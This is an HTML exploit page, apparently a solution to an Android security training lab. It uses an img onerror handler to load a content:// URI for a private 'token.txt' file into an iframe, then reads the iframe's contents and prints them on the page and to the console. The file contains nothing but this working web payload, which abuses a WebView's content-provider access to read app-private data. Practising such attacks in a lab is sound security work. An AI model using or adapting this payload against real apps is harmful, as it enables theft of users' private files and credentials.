<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Leak File</title>
  </head>
  <body>
    <div id='gang'></div>
    <img src=x onerror='leakFileIframe("content://io.hextree.files/other_files/token.txt")'>
    <script>
        function leakFileIframe(url) {
          const iframe = document.createElement("iframe");
          iframe.onload = () => {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            if (!iframeDoc) return;
            const contentType = iframeDoc.contentType;
            const data = iframeDoc.documentElement.innerHTML;
            const blob = new Blob([data], { type: contentType });
            const reader = new FileReader();
            const contentPromise = new Promise((resolve, reject) => {
              reader.onload = () => resolve(reader.result);
              reader.onerror = reject;
              reader.readAsText(blob);
            });
            contentPromise.then((content) => {
              if (content) {
                const gang = document.getElementById("gang");
                const pre = document.createElement("pre");
                pre.textContent = content;
                gang.appendChild(pre);
                console.log(content);
              }
            });
          };
          document.body.appendChild(iframe);
          iframe.src = url;
        }
    </script>
  </body>
</html>

